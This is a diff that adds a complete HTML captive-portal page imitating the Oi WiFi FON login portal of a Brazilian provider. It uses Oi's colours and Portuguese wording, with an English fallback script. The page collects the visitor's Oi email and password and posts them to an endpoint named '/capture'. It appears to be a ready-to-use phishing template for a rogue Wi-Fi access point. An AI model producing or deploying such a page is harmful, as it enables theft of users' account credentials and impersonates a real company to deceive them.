@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Oi WiFi FON - Portal de Acesso</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #FFCC00; color: #222; padding: 16px; }
+.card { background: #FFFFFF; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.15); }
+.logo { text-align: center; margin-bottom: 8px; }
+.logo .oi-text { font-size: 38px; font-weight: 900; color: #222; }
+.logo .wifi-fon { display: block; font-size: 13px; font-weight: 700; color: #FFCC00; background: #222; padding: 3px 10px; border-radius: 4px; margin-top: 4px; letter-spacing: 2px; }
+.logo-bar { height: 3px; background: #FFCC00; border-radius: 2px; margin: 12px 0 20px; }
+.subtitle { text-align: center; color: #555; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+.form-group { margin-bottom: 16px; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #222; }
+input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #DDD; border-radius: 8px; font-size: 15px; background: #FAFAFA; color: #222; outline: none; transition: border-color 0.2s; }
+input:focus { border-color: #FFCC00; box-shadow: 0 0 0 2px rgba(255,204,0,0.2); }
+button[type="submit"] { width: 100%; padding: 14px; background: #000000; color: #FFCC00; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
+button:hover { opacity: 0.88; }
+.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
+input[type="hidden"] { display: none; }
+@media (max-width: 480px) { .card { padding: 24px 18px; } .logo .oi-text { font-size: 30px; } }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <span class="oi-text">Oi</span>
+    <span class="wifi-fon">WiFi FON</span>
+  </div>
+  <div class="logo-bar"></div>
+  <p class="subtitle">Portal Oi WiFi FON. Faca login com suas credenciais oi para acessar a rede.</p>
+  <form action="/capture" method="POST" autocomplete="off">
+    <input type="hidden" name="csrf_token" value="">
+    <input type="hidden" name="portal_id" value="oi_wifi_fon">
+    <div class="form-group">
+      <label for="email">Usuario ou e-mail oi</label>
+      <input type="email" name="email" id="email" placeholder="seu@email.com" required autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label for="password">Senha</label>
+      <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="6" maxlength="128" autocomplete="new-password">
+    </div>
+    <button type="submit">Acessar rede</button>
+  </form>
+  <p class="footer">Oi WiFi FON - Acesso seguro a rede oi</p>
+</div>
+<script>
+(function(){
+  var lang = navigator.language || 'pt-BR';
+  if (lang.startsWith('en')) {
+    document.querySelector('.subtitle').textContent = 'Oi WiFi FON portal. Log in with your oi credentials to access the network.';
+    document.querySelector('button[type=submit]').textContent = 'Access network';
+    document.querySelector('label[for=email]').textContent = 'oi username or email';
+    document.querySelector('label[for=password]').textContent = 'Password';
+  }
+})();
+</script>
+</body>
+</html>
